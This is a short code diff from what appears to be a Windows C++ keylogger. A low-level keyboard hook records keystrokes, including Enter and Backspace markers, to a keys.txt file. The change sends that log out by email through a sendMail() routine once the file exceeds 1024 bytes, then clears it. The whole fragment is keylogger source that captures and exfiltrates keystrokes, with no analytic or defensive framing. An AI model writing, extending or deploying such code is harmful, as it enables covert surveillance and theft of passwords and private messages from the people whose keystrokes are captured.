@@ -18,9 +18,16 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
 		//按键被按下
 		switch (p->vkCode) {
 		case VK_RETURN: out << "<ENTER>";	
-			if (sendMail()) {
-				out.close();
-				ofstream out("keys.txt", ios::out);
+			{
+				HANDLE fd = CreateFile(L"keys.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+				WORD len = GetFileSize(fd, NULL);
+				CloseHandle(fd);
+				if (len > 1024) {
+					if (sendMail()) {
+						out.close();
+						ofstream out("keys.txt", ios::out);
+					}
+				}
 			};
 		break;
 		case VK_BACK: out << "<BK>" ; break;
